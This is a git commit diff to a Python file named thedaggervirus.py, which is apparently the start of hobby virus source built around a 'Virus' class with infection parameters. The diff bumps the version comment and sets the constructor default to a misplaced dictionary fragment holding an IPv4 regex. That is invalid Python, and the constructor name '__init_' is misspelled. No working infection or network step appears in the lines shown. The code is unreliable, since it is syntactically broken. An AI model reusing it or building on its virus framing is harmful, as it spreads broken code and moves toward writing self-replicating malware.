1ced905ba7b39e4e70573567f41eb1ab0905ef59
Mr. David <dbishop4880@outlook.com>
2024-12-12 10:26:37 -0500

    Update (1) thedaggervirus.py

--- thedaggervirus.py
+++ thedaggervirus.py
@@ -1,6 +1,6 @@
-#version 0.1 (first version of The Dagger Virus)
+#version 0.1.1 (first version of The Dagger Virus)
 class Virus:
-    def __init_(self, infect_string=None, path=None,   \
+    def __init_(self, infect_string="ipv4": "\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b", path=None,   \
                         extension=None, target_file_list=None):
         if isinstance(infect_string, type(type)):
             self.infect_string="I am TheDaggerVirus"
